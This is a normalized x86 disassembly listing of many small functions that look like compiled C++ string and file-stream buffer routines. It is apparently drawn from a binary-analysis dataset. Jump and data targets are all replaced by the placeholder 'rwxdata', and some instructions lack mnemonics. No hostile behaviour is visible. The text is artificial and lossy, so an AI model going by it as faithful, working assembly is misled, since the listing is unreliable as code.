push [ esi + 0x50 ]
push edi
call sub_4294d5
add esp 0xc
test al al
je rwxdata
mov eax ebx
jmp rwxdata
push [ rwxdata ]
mov ecx [ esi + 0x44 ]
push 0x0
call sub_42910e
mov eax [ esi + 0x3c ]
mov [ esi + 0x40 ] eax
mov eax [ esp + 0x10 ]
jmp rwxdata
sub_428e34
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je rwxdata
push edi
mov edi [ esi ]
mov ecx esi
call [ edi + 0x14 ]
push eax
mov ecx esi
call [ edi + 0x8 ]
pop edi
pop esi
retn
mov ecx [ esi + 0x2c ]
mov ecx [ ecx ]
add ecx eax
cmp eax ecx
jae rwxdata
movzx eax [ eax ]
pop esi
retn
sub_428e61
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je rwxdata
mov eax [ esi + 0x50 ]
test eax eax
jne rwxdata
mov ecx [ esi + 0x2c ]
mov ecx [ ecx ]
add ecx eax
cmp eax ecx
jae rwxdata
cmp [ esi + 0x38 ] 0x0
jne rwxdata
or eax 0xffffffff
jmp rwxdata
mov ecx esi
call sub_429201
movzx eax [ eax ]
jmp rwxdata
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x44 ]
mov [ esi + 0x3c ] eax
push [ rwxdata ]
push 0x0
call sub_42910e
push eax
call sub_42b407
cmp eax 0xffffffff
pop ecx
je rwxdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ esi + 0x44 ]
push eax
push 0x1
call sub_4290b5
mov edi [ esi + 0x44 ]
mov eax [ esi + 0x3c ]
mov ecx edi
mov [ esi + 0x40 ] eax
call sub_4292c0
mov ebx [ esi + 0x44 ]
mov eax [ edi + 0x4 ]
mov ecx ebx
mov [ ebp - 0x8 ] eax
call sub_4292c0
mov ecx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
lea edi [ ebp - 0xc ]
mov ebx [ ebx + 0x4 ]
push edi
lea edi [ ebp ]
add ecx eax
push edi
neg eax
lea edi [ ebp - 0x1 ]
sbb eax eax
push edi
lea edi [ ebp - 0x10 ]
and eax ecx
mov ecx [ esi + 0x38 ]
push edi
push eax
lea eax [ esi + 0x40 ]
mov edx [ ecx ]
push ebx
push eax
call [ edx + 0x10 ]
sub eax 0x0
je rwxdata
movzx eax al
jmp rwxdata
movzx eax [ ebp - 0x1 ]
dec eax
je rwxdata
push [ esi + 0x50 ]
call sub_42b407
cmp eax 0xffffffff
pop ecx
je rwxdata
dec eax
dec eax
jne rwxdata
mov eax [ esi + 0x44 ]
cmp [ eax + 0x8 ] 0x1
jb rwxdata
mov esi eax
mov ecx esi
call sub_4292c0
push 0x1
lea eax [ ebp - 0x1 ]
push [ esi + 0x4 ]
push eax
call sub_422780
add esp 0xc
sub_428f76
push ebp
mov ebp esp
sub esp 0x20
push esi
mov esi ecx
push edi
mov eax [ esi + 0x50 ]
test eax eax
je rwxdata
mov eax [ rwxdata ]
or [ ebp - 0x20 ] 0xffffffff
mov [ ebp - 0x18 ] eax
mov eax [ rwxdata ]
mov [ ebp - 0x14 ] eax
mov eax [ rwxdata ]
push 0x6
mov [ ebp - 0x10 ] eax
pop ecx
lea esi [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_42b443
add esp 0xc
test eax eax
jne rwxdata
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x50 ]
call sub_42b421
pop ecx
test eax eax
pop ecx
jne rwxdata
and [ ebp - 0x20 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x40 ]
push 0x6
mov [ ebp - 0x10 ] eax
pop ecx
lea esi [ ebp - 0x20 ]
jmp rwxdata
mov eax [ ebp + 0x8 ]
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x10
sub_428ff8
push esi
mov esi ecx
mov eax [ esi + 0x50 ]
test eax eax
je rwxdata
xor eax eax
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push eax
call sub_42b4e7
add esp 0x10
test eax eax
jne rwxdata
mov eax esi
jmp rwxdata
pop esi
retn 0x8
sub_4290b5
mov eax [ rwxdata ]
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
sub eax [ esi + 0x8 ]
cmp eax ebx
ja rwxdata
test ebx ebx
jbe rwxdata
call sub_42aa92
mov eax esi
pop edi
pop esi
pop ebx
retn 0x8
mov edi ebx
push 0x0
add edi [ esi + 0x8 ]
mov ecx esi
push edi
call sub_4292ec
test al al
je rwxdata
movsx eax [ esp + 0x14 ]
push ebx
push eax
mov eax [ esi + 0x4 ]
add eax [ esi + 0x8 ]
push eax
call sub_422720
mov eax [ esi + 0x4 ]
add esp 0xc
mov [ esi + 0x8 ] edi
and [ eax + edi ] 0x0
sub_42910e
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ edi + 0x8 ] esi
jae rwxdata
mov ecx edi
call sub_429371
mov eax [ edi + 0x8 ]
mov ebx [ esp + 0x14 ]
sub eax esi
cmp eax ebx
jae rwxdata
call sub_42acb1
test ebx ebx
jbe rwxdata
mov ebx eax
mov eax edi
pop edi
pop esi
pop ebx
retn 0x8
mov ecx [ edi + 0x4 ]
sub eax ebx
add ecx esi
push eax
lea eax [ ecx + ebx ]
push eax
push ecx
call sub_427650
mov esi [ edi + 0x8 ]
add esp 0xc
sub esi ebx
mov ecx edi
push 0x0
push esi
call sub_4292ec
test al al
je rwxdata
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] esi
and [ esi + eax ] 0x0
sub_429175
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je rwxdata
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
pop esi
retn 0x4
mov eax [ esi + 0x4 ]
test eax eax
je rwxdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je rwxdata
push ecx
call sub_42aa87
pop ecx
cmp al 0xff
je rwxdata
dec al
mov [ ecx ] al
jmp rwxdata
sub_4291b1
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
and [ esi + 0x2c ] 0x0
mov [ esi + 0x28 ] eax
mov [ esi + 0x30 ] 0x20
call sub_42a69f
cmp [ esi + 0x28 ] 0x0
jne rwxdata
cmp [ esp + 0xc ] 0x0
je rwxdata
mov eax [ esi + 0x4 ]
push 0x0
or al 0x4
mov ecx esi
or al 0x4
push eax
call sub_42a36e
pop esi
retn 0x8
mov ecx esi
call sub_42a66a
sub_429221
push esi
mov esi ecx
mov eax [ esi + 0x50 ]
test eax eax
je rwxdata
xor eax eax
pop esi
retn
push eax
call sub_422ab5
test eax eax
pop ecx
jne rwxdata
push 0x2
push eax
mov ecx esi
call sub_429248
mov eax esi
pop esi
retn
sub_429248
cmp [ esp + 0x8 ] 0x1
push esi
mov esi ecx
sete al
cmp [ esp + 0xc ] 0x0
mov [ esi + 0x48 ] al
jne rwxdata
mov ecx esi
call sub_4293d6
mov eax [ esp + 0x8 ]
test eax eax
je rwxdata
push edi
lea edi [ esi + 0x4c ]
mov ecx edi
call sub_428a89
test edi edi
je rwxdata
mov [ esi + 0x50 ] eax
mov eax [ rwxdata ]
mov [ esi + 0x40 ] eax
mov eax [ rwxdata ]
and [ esi + 0x38 ] 0x0
mov [ esi + 0x3c ] eax
pop esi
retn 0x8
cmp [ esi + 0x48 ] 0x0
jne rwxdata
and [ esi + 0x44 ] 0x0
pop edi
mov ecx edi
call sub_428a6a
lea ecx [ eax + 0x8 ]
mov [ esi + 0x1c ] eax
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] ecx
lea ecx [ eax + 0x4 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x2c ] ecx
mov [ esi + 0x30 ] ecx
sub_4292c0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je rwxdata
mov esi [ esi + 0x4 ]
test esi esi
je rwxdata
mov al [ eax - 0x1 ]
test al al
je rwxdata
pop esi
retn
or [ esi - 0x1 ] 0xff
cmp al 0xff
je rwxdata
push 0x0
push [ esi + 0x8 ]
call sub_4292ec
sub_4292ec
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0xfffffffd
jbe rwxdata
mov ecx [ esi + 0x4 ]
xor edx edx
cmp ecx edx
je rwxdata
call sub_42aa92
cmp edi edx
jne rwxdata
mov al [ ecx - 0x1 ]
cmp al dl
je rwxdata
cmp [ esp + 0x10 ] dl
je rwxdata
cmp [ esp + 0x10 ] dl
je rwxdata
cmp al 0xff
je rwxdata
cmp [ esi + 0xc ] edi
jae rwxdata
mov eax [ esi + 0xc ]
cmp eax 0x1f
ja rwxdata
cmp ecx edx
je rwxdata
push 0x1
jmp rwxdata
cmp edi edx
jne rwxdata
mov al 0x1
push edi
mov ecx esi
call sub_429418
push 0x1
mov ecx esi
call sub_429175
jmp rwxdata
cmp eax edi
jae rwxdata
xor al al
jmp rwxdata
mov [ esi + 0x8 ] edx
mov [ ecx ] dl
jmp rwxdata
mov ecx esi
call sub_429175
dec al
push edx
mov [ ecx - 0x1 ] al
pop edi
pop esi
retn 0x8
sub_429371
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je rwxdata
pop edi
pop esi
retn
mov al [ esi - 0x1 ]
test al al
je rwxdata
cmp al 0xff
je rwxdata
push 0x1
call sub_429175
push esi
call sub_4224c0
pop ecx
push eax
push esi
mov ecx edi
call sub_4293a1
sub_4293a1
push esi
push edi
mov edi [ esp + 0x10 ]
push 0x1
mov esi ecx
push edi
call sub_4292ec
test al al
je rwxdata
mov eax esi
pop edi
pop esi
retn 0x8
push edi
push [ esp + 0x10 ]
push [ esi + 0x4 ]
call sub_422780
mov eax [ esi + 0x4 ]
add esp 0xc
mov [ esi + 0x8 ] edi
and [ eax + edi ] 0x0
sub_4293d6
lea edx [ ecx + 0x14 ]
lea eax [ ecx + 0x4 ]
mov [ ecx + 0x1c ] edx
lea edx [ ecx + 0x18 ]
mov [ ecx + 0x20 ] edx
lea edx [ ecx + 0x24 ]
mov [ ecx + 0x2c ] edx
lea edx [ ecx + 0x28 ]
mov [ ecx + 0xc ] eax
lea eax [ ecx + 0x8 ]
mov [ ecx + 0x30 ] edx
xor edx edx
mov [ ecx + 0x10 ] eax
mov [ eax ] edx
mov eax [ ecx + 0x20 ]
mov [ eax ] edx
mov eax [ ecx + 0x30 ]
mov [ eax ] edx
mov eax [ ecx + 0xc ]
mov [ eax ] edx
mov eax [ ecx + 0x1c ]
mov [ eax ] edx
mov eax [ ecx + 0x2c ]
mov [ eax ] edx
retn
sub_429418
mov eax sub_42cef4
call sub_42b24c
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
or edi 0x1f
mov esi ecx
cmp edi 0xfffffffd
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
jbe rwxdata
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x2 ]
test eax eax
jge rwxdata
mov edi [ ebp + 0x8 ]
push eax
call sub_42b588
pop ecx
mov [ ebp + 0x8 ] eax
jmp rwxdata
xor eax eax
mov eax [ esi + 0x8 ]
test eax eax
jbe rwxdata
mov ebx [ esi + 0x8 ]
push 0x1
mov ecx esi
call sub_429175
mov eax [ ebp + 0x8 ]
inc eax
mov [ esi + 0x4 ] eax
and [ eax - 0x1 ] 0x0
cmp ebx edi
mov [ esi + 0xc ] edi
ja rwxdata
cmp eax edi
jbe rwxdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x8 ] edi
and [ eax + edi ] 0x0
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov edi ebx
push eax
mov eax [ ebp + 0x8 ]
push [ esi + 0x4 ]
inc eax
push eax
call sub_422780
add esp 0xc
mov eax edi
sub_4294d5
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0x10 ]
push edi
test esi esi
lea edi [ eax + esi ]
jbe rwxdata
jne rwxdata
movzx eax [ edi - 0x1 ]
push [ esp + 0x10 ]
dec edi
push eax
call sub_42b399
pop ecx
cmp eax 0xffffffff
pop ecx
je rwxdata
push 0x1
pop edi
cmp esi edi
jae rwxdata
mov al 0x1
jmp rwxdata
test esi esi
dec esi
jne rwxdata
xor al al
sub edi esi
pop edi
pop esi
retn
push [ esp + 0x10 ]
call sub_42b407
dec edi
pop ecx
jne rwxdata
sub_429725
mov eax sub_42cf70
call sub_42b24c
push ecx
push ecx
xor eax eax
mov [ ebp - 0x10 ] ecx
cmp [ rwxdata ] eax
mov [ ebp - 0x14 ] eax
jl rwxdata
push esi
push edi
push 0x1
mov esi rwxdata
pop edi
mov [ ebp - 0x14 ] esi
mov [ rwxdata ] edi
mov [ ebp - 0x4 ] eax
mov eax esi
test eax eax
je rwxdata
inc [ rwxdata ]
jmp rwxdata
mov ecx rwxdata
mov [ ebp - 0x14 ] ecx
mov eax ecx
mov [ ebp - 0x4 ] edi
test eax eax
je rwxdata
push rwxdata
mov ecx esi
call sub_429a98
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
leave
retn
mov ecx rwxdata
mov [ ebp - 0x14 ] ecx
mov eax ecx
mov [ ebp - 0x4 ] 0x2
test eax eax
je rwxdata
push rwxdata
call sub_429a98
push ebx
mov ebx rwxdata
mov [ ebp - 0x14 ] ebx
mov eax ebx
mov [ ebp - 0x4 ] 0x3
test eax eax
je rwxdata
push rwxdata
call sub_429a98
mov edi rwxdata
mov [ ebp - 0x14 ] edi
mov eax edi
mov [ ebp - 0x4 ] 0x4
test eax eax
je rwxdata
push edi
push edi
push esi
mov ecx ebx
call sub_4299d1
mov eax [ rwxdata ]
mov esi rwxdata
mov [ ebp - 0x14 ] esi
mov eax [ eax + 0x4 ]
mov [ eax + ebx + 0x2c ] edi
add eax ebx
mov eax esi
mov [ ebp - 0x4 ] 0x5
test eax eax
pop ebx
je rwxdata
push 0x1
push 0x1
push 0x1
push rwxdata
mov ecx edi
call sub_4298b3
mov eax [ rwxdata ]
mov ecx rwxdata
mov [ ebp - 0x14 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x2c ] edi
add eax esi
mov eax [ rwxdata ]
mov eax [ eax + 0x4 ]
or [ eax + esi + 0xc ] 0x2
add eax esi
mov eax ecx
mov [ ebp - 0x4 ] 0x6
test eax eax
je rwxdata
push 0x1
push 0x1
push 0x1
push rwxdata
mov ecx esi
call sub_4298b3
mov eax [ rwxdata ]
mov eax [ eax + 0x4 ]
mov [ eax + rwxdata ] edi
pop edi
pop esi
push 0x1
push 0x1
push 0x1
push rwxdata
call sub_4298b3
sub_4298b3
mov eax sub_42cf96
call sub_42b24c
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0x14 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je rwxdata
mov ecx [ esi ]
cmp [ ebp + 0x10 ] al
mov ecx [ ecx + 0x4 ]
mov [ ecx + esi ] rwxdata
je rwxdata
mov [ esi ] rwxdata
mov [ esi + 0x28 ] eax
mov [ esi + 0x4 ] rwxdata
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov eax [ esi ]
push [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
push [ ebp + 0x8 ]
add ecx esi
call sub_42a20c
sub_42991d
mov eax sub_42cfba
call sub_42b24c
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0xc ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je rwxdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ eax + esi ] rwxdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_42a66a
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov [ esi ] rwxdata
mov [ esi + 0x28 ] eax
mov [ esi + 0x4 ] rwxdata
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
sub_42997c
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
test [ eax + 0x4 ] 0x6
jne rwxdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
test edi edi
je rwxdata
mov eax [ eax + 0x28 ]
mov ecx eax
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax 0xffffffff
jne rwxdata
mov eax esi
pop edi
pop esi
retn
mov eax [ ecx + 0x4 ]
or eax edi
cmp [ ecx + 0x28 ] 0x0
jne rwxdata
push 0x4
pop edi
push 0x0
push eax
call sub_42a36e
or al 0x4
sub_4299d1
mov eax sub_42cfde
call sub_42b24c
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0x10 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je rwxdata
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push [ ebp + 0x8 ]
mov [ eax + esi ] rwxdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_42a20c
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov [ esi ] rwxdata
mov [ esi + 0x2c ] eax
mov [ esi + 0x8 ] rwxdata
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
sub_429a39
mov eax sub_42d002
call sub_42b24c
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0xc ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je rwxdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ eax + esi ] rwxdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_42a66a
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov [ esi ] rwxdata
mov [ esi + 0x2c ] eax
mov [ esi + 0x8 ] rwxdata
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
sub_429a98
mov eax sub_42d02a
call sub_42b24c
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
lea ecx [ esi + 0x34 ]
call sub_428a6a
and [ ebp - 0x4 ] 0x0
mov ecx esi
mov [ esi ] rwxdata
call sub_4293d6
lea ecx [ esi + 0x4c ]
mov [ ebp - 0x4 ] 0x1
call sub_428a6a
push 0x0
mov ecx esi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x2
mov [ esi ] rwxdata
call sub_42a2d6
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_429b15
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x10 ]
cmp ax 0xffff
jne rwxdata
mov ecx esi
call sub_42a27b
mov ax [ eax ]
pop esi
retn
mov eax 0xffff
pop esi
retn
sub_429b36
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push ebx
push esi
push edi
mov edi ecx
jle rwxdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
mov esi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
cmp ax 0xffff
je rwxdata
mov eax [ edi + 0x2c ]
mov eax [ eax ]
shl eax 0x1
sar eax 0x1
test eax eax
jle rwxdata
mov [ esi ] ax
inc esi
inc esi
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] eax
jge rwxdata
mov eax [ edi + 0x1c ]
mov edx [ eax ]
test edx edx
je rwxdata
test eax eax
mov ecx esi
jbe rwxdata
mov eax [ ebp + 0xc ]
add [ ebp - 0x4 ] eax
sub [ ebp + 0xc ] eax
push eax
mov ecx edi
lea esi [ esi + eax * 2 ]
call sub_42a256
jmp rwxdata
mov [ ebp + 0x8 ] eax
cmp [ ebp + 0xc ] 0x0
jg rwxdata
mov bx [ edx ]
mov [ ecx ] bx
inc ecx
inc ecx
inc edx
inc edx
dec [ ebp + 0x8 ]
jne rwxdata
sub_429bbd
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push ebx
push esi
push edi
mov edi ecx
jle rwxdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
mov esi [ ebp + 0x8 ]
mov ax [ esi ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x4 ]
cmp ax 0xffff
je rwxdata
mov eax [ edi + 0x30 ]
mov eax [ eax ]
shl eax 0x1
sar eax 0x1
test eax eax
jle rwxdata
inc esi
inc esi
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] eax
jge rwxdata
mov eax [ edi + 0x20 ]
mov ecx [ eax ]
test ecx ecx
je rwxdata
test eax eax
mov edx esi
jbe rwxdata
mov eax [ ebp + 0xc ]
add [ ebp - 0x4 ] eax
sub [ ebp + 0xc ] eax
push eax
mov ecx edi
lea esi [ esi + eax * 2 ]
call sub_42a28b
jmp rwxdata
mov [ ebp + 0x8 ] eax
cmp [ ebp + 0xc ] 0x0
jg rwxdata
mov bx [ edx ]
mov [ ecx ] bx
inc ecx
inc ecx
inc edx
inc edx
dec [ ebp + 0x8 ]
jne rwxdata
sub_429c45
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rwxdata ]
or [ ebp - 0x18 ] 0xffffffff
mov [ ebp - 0x10 ] eax
mov eax [ rwxdata ]
mov [ ebp - 0xc ] eax
mov eax [ rwxdata ]
push esi
push edi
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push 0x6
lea esi [ ebp - 0x18 ]
pop ecx
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x10
sub_429c7c
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rwxdata ]
or [ ebp - 0x18 ] 0xffffffff
mov [ ebp - 0x10 ] eax
mov eax [ rwxdata ]
mov [ ebp - 0xc ] eax
mov eax [ rwxdata ]
push esi
push edi
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push 0x6
lea esi [ ebp - 0x18 ]
pop ecx
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x20
sub_429cc1
mov eax sub_42d047
call sub_42b24c
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] rwxdata
cmp [ esi + 0x48 ] 0x0
mov [ ebp - 0x4 ] 0x1
je rwxdata
mov edi [ esi + 0x44 ]
test edi edi
je rwxdata
call sub_42a2af
lea ecx [ esi + 0x4c ]
call sub_428a89
lea ecx [ esi + 0x34 ]
mov [ esi ] rwxdata
call sub_428a89
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push 0x1
mov ecx edi
call sub_429175
push edi
call sub_42aa87
pop ecx
sub_429d26
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp di 0xffff
mov esi ecx
jne rwxdata
mov eax [ esi + 0x20 ]
xor ebx ebx
mov eax [ eax ]
cmp eax ebx
je rwxdata
xor ax ax
jmp rwxdata
mov eax [ esi + 0x50 ]
cmp eax ebx
jne rwxdata
mov ecx [ esi + 0x30 ]
mov ecx [ ecx ]
lea ecx [ eax + ecx * 2 ]
cmp eax ecx
jae rwxdata
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp [ esi + 0x38 ] ebx
jne rwxdata
or ax 0xffff
jmp rwxdata
mov ecx esi
call sub_42a29f
mov [ eax ] di
mov ax di
jmp rwxdata
push [ rwxdata ]
mov ecx [ esi + 0x44 ]
mov [ ebp - 0x4 ] edi
push ebx
call sub_42910e
mov ecx [ esi + 0x44 ]
push ebx
push 0x8
call sub_4290b5
mov edi [ esi + 0x44 ]
mov ecx edi
call sub_4292c0
mov ebx [ esi + 0x44 ]
mov eax [ edi + 0x4 ]
mov ecx ebx
mov [ ebp - 0x8 ] eax
call sub_4292c0
mov eax [ ebp - 0x8 ]
mov ecx [ edi + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx eax
neg eax
sbb eax eax
lea edi [ ebp - 0x10 ]
and eax ecx
push edi
mov ecx [ esi + 0x38 ]
push eax
lea eax [ ebp - 0xc ]
push ebx
mov edx [ ecx ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0x40 ]
push eax
call [ edx + 0x14 ]
sub eax 0x0
je rwxdata
push eax
push edi
call sub_42b596
pop ecx
cmp ax 0xffff
pop ecx
mov eax edi
jmp rwxdata
mov ebx [ esi + 0x44 ]
mov ecx ebx
call sub_4292c0
mov edi [ ebp - 0x10 ]
sub edi [ ebx + 0x4 ]
mov ebx [ esi + 0x44 ]
mov ecx ebx
call sub_4292c0
push [ esi + 0x50 ]
mov ebx [ ebx + 0x4 ]
push edi
push 0x1
push ebx
call sub_42b26b
add esp 0x10
cmp eax edi
mov eax [ ebp + 0x8 ]
je rwxdata
dec eax
je rwxdata
jne rwxdata
mov eax 0xffff
lea eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] eax
je rwxdata
dec eax
dec eax
jne rwxdata
jmp rwxdata
push [ esi + 0x50 ]
push [ ebp - 0x4 ]
call sub_42b596
pop ecx
cmp ax 0xffff
mov eax [ ebp + 0x8 ]
pop ecx
sub_429e6e
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je rwxdata
mov edi [ esp + 0x10 ]
mov ecx [ esi + 0xc ]
cmp [ ecx ] eax
jae rwxdata
or ax 0xffff
cmp di 0xffff
je rwxdata
mov edi [ esp + 0x10 ]
cmp di 0xffff
je rwxdata
cmp [ esi + 0x38 ] 0x0
jne rwxdata
mov ecx esi
call sub_42a26a
mov ax di
inc ax
neg ax
sbb eax eax
and eax edi
jmp rwxdata
cmp [ eax - 0x2 ] di
jne rwxdata
mov edi [ esi + 0x44 ]
mov ebx [ edi + 0x8 ]
test ebx ebx
jbe rwxdata
push eax
push edi
call sub_42b68b
pop ecx
cmp ax 0xffff
pop ecx
mov eax edi
jne rwxdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x50 ]
test eax eax
je rwxdata
mov ecx edi
call sub_4292c0
mov edi [ edi + 0x4 ]
push ebx
push [ esi + 0x50 ]
push edi
call sub_4294d5
add esp 0xc
test al al
je rwxdata
mov eax 0xffff
jmp rwxdata
push [ rwxdata ]
mov ecx [ esi + 0x44 ]
push 0x0
call sub_42910e
mov eax [ esi + 0x3c ]
mov [ esi + 0x40 ] eax
mov ax [ esp + 0x10 ]
jmp rwxdata
sub_429f25
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je rwxdata
push edi
mov edi [ esi ]
mov ecx esi
call [ edi + 0x14 ]
push eax
mov ecx esi
call [ edi + 0x8 ]
pop edi
pop esi
retn
mov ecx [ esi + 0x2c ]
mov ecx [ ecx ]
lea ecx [ eax + ecx * 2 ]
cmp eax ecx
jae rwxdata
mov ax [ eax ]
pop esi
retn
sub_429f53
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je rwxdata
mov eax [ esi + 0x50 ]
test eax eax
jne rwxdata
mov ecx [ esi + 0x2c ]
mov ecx [ ecx ]
lea ecx [ eax + ecx * 2 ]
cmp eax ecx
jae rwxdata
cmp [ esi + 0x38 ] 0x0
jne rwxdata
or ax 0xffff
jmp rwxdata
mov ecx esi
call sub_42a27b
mov ax [ eax ]
jmp rwxdata
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x44 ]
mov [ esi + 0x3c ] eax
push [ rwxdata ]
push 0x0
call sub_42910e
push eax
call sub_42b774
cmp ax 0xffff
pop ecx
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ esi + 0x44 ]
push eax
push 0x1
call sub_4290b5
mov edi [ esi + 0x44 ]
mov eax [ esi + 0x3c ]
mov ecx edi
mov [ esi + 0x40 ] eax
call sub_4292c0
mov ebx [ esi + 0x44 ]
mov eax [ edi + 0x4 ]
mov ecx ebx
mov [ ebp - 0x8 ] eax
call sub_4292c0
mov ecx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
lea edi [ ebp - 0xc ]
mov ebx [ ebx + 0x4 ]
push edi
lea edi [ ebp ]
add ecx eax
push edi
neg eax
lea edi [ ebp - 0x2 ]
sbb eax eax
push edi
lea edi [ ebp - 0x10 ]
and eax ecx
mov ecx [ esi + 0x38 ]
push edi
push eax
lea eax [ esi + 0x40 ]
mov edx [ ecx ]
push ebx
push eax
call [ edx + 0x10 ]
sub eax 0x0
je rwxdata
mov eax 0xffff
jmp rwxdata
mov ax [ ebp - 0x2 ]
dec eax
je rwxdata
push [ esi + 0x50 ]
call sub_42b407
cmp eax 0xffffffff
pop ecx
je rwxdata
dec eax
dec eax
jne rwxdata
